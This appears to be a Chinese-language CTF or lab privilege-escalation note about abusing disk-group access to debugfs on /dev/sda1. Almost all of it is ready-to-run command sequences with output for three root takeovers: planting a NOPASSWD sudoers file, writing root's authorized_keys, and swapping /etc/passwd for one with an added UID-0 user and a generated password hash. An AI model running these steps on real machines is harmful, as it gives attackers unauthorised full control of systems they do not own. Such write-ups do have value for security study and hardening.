**DebugFS** 是 Linux 内核提供的一种文件系统，主要用于开发者将内核信息暴露给用户空间。

debugfs修改实际上不在文件系统层，可以通过ln链接文件到文件系统从而实现读取

用户在disk组中
```
Dodo@ezai1:~$ df
Filesystem     1K-blocks    Used Available Use% Mounted on
udev             1006820       0   1006820   0% /dev
tmpfs             204340     520    203820   1% /run
/dev/sda1       29801344 2703128  25559044  10% /
tmpfs            1021696       0   1021696   0% /dev/shm
tmpfs               5120       0      5120   0% /run/lock
tmpfs             204336       0    204336   0% /run/user/1000
```
df查看挂载

## 1.sudo提权
```
Dodo@ezai1:~$ echo "Dodo ALL=(ALL) NOPASSWD: ALL" > /tmp/give_dodo_sudo
Dodo@ezai1:~$ /usr/sbin/debugfs -w /dev/sda1
debugfs 1.44.5 (15-Dec-2018)
# 写入文件并获取 Inode 编号
debugfs: write /tmp/give_dodo_sudo /etc/sudoers.d/give_dodo_sudo
Allocated inode: 26
# 链接文件名到 Inode
debugfs: ln <26> /etc/sudoers.d/give_dodo_sudo
# 设置文件模式为 0440
debugfs: sif <26> i_mode 0100440
# 设置所有者用户为 root (UID 0)
debugfs: sif <26> i_uid 0
# 设置所有者组为 root (GID 0)
debugfs: sif <26> i_gid 0
# 退出
debugfs: quit
```
sudo即可

## 2.公钥提权
	
```
debugfs: mkdir /root/.ssh 0700 0 0
debugfs: write /tmp/auth_keys /root/.ssh/authorized_keys
Allocated inode: 28
debugfs: ln <28> /root/.ssh/authorized_keys
debugfs: sif <28> i_mode 0100600
debugfs: sif <28> i_uid 0
debugfs: sif <28> i_gid 0
```
## 3.passwd提权

```
Dodo@ezai1:~$ cp /etc/passwd passwd
Dodo@ezai1:~$ cp /etc/passwd passwd.bak
Dodo@ezai1:~$ openssl passwd -1 -salt abc password
$1$abc$BXBqpb9BZcZhXLgbee.0s/
Dodo@ezai1:~$ echo 'test:$1$abc$BXBqpb9BZcZhXLgbee.0s/:0:0:,,,:/root:/bin/bash' >> passwd
Dodo@ezai1:~$ cp passwd /tmp/passwd_tmp
Dodo@ezai1:~$ /usr/sbin/debugfs -w /dev/sda1
debugfs 1.44.5 (15-Dec-2018)
debugfs:  write /tmp/passwd_tmp /etc/passwd
write: Ext2 file already exists 
debugfs:  rm /etc/passwd
debugfs:  write /tmp/passwd_tmp /etc/passwd
Allocated inode: 21
debugfs:  ln <21> /etc/passwd
debugfs:  sif <21> i_mode 0100644
debugfs:  sif <21> i_uid 0
debugfs:  sif <21> i_gid 0
debugfs:  q
```
